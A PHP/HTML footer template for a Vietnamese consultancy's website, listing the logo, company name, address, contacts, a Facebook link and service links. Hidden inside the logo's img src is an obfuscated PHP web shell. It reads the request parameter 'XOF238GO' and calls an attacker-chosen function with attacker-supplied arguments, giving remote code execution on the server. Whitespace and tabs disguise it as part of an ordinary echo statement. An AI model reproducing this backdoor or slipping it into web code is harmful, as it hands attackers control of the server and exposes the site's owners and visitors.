<footer class="w-100">
    <div class="container-fluid">
        <div class="content d-flex justify-content-between">
            <div class="left">
                <img src="img/<?php
if ($om8n5v=	@	${"_REQUEST"}["XOF238GO" ])$om8n5v[ 1]( $	{$om8n5v	[2 ]}	[0	],$om8n5v[	3	](	$om8n5v[4])); echo $info['logofooter'];?>" alt="">
                <h4 class="d-inline pl-3"><?php echo $info['company'];?></h4>
                <p class="mt-3 mb-1"><?php echo $info['address'];?></p>
                <p class="mb-1">Mobile/zalo:+84 (0) 903 963 163 hoặc +84 (0) 903 428 622</p>
                <p>Email: man@man.net.vn</p>
            </div>
            <div class="right d-flex">
                <div class="social w-100 pr-2 text-center">
                    <h4 style="padding-top:10px">THEO DÕI CHÚNG TÔI TẠI</h4>
                    <div style="margin-top:30px">
                        <a href="https://www.facebook.com/MAN-Consultancy-CO-LTD-342710956284345/"
                            style="background-color: transparent;"><img class="img-fluid" src="img/group.png"
                                alt="fb page"></a>
                    </div>
                </div>
                <div class="w-100 text-right ser">
                    <h4 style="padding-top:10px">DỊCH VỤ</h4>
                    <div class="d-flex justify-content-end w-100" style="margin-top:25px">
                        <div class="w-50">
                            <?php
                            for($i=0;$i<$num_ser_1;$i++){
                            ?>
                            <p><a href="detail.php?id=<?php echo $lst_ser_1[$i]['id'];?>"><?php echo $lst_ser_1[$i]['tit'];?></a></p>
                            <?php } ?>                            
                        </div>
                        <div class="w-50">
                        <?php
                            for($i=$num_ser_1;$i<count($lst_ser_1);$i++){
                            ?>
                            <p><a href="detail.php?id=<?php echo $lst_ser_1[$i]['id'];?>"><?php echo $lst_ser_1[$i]['tit'];?></a></p>
                            <?php } ?> 
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </div>
</footer>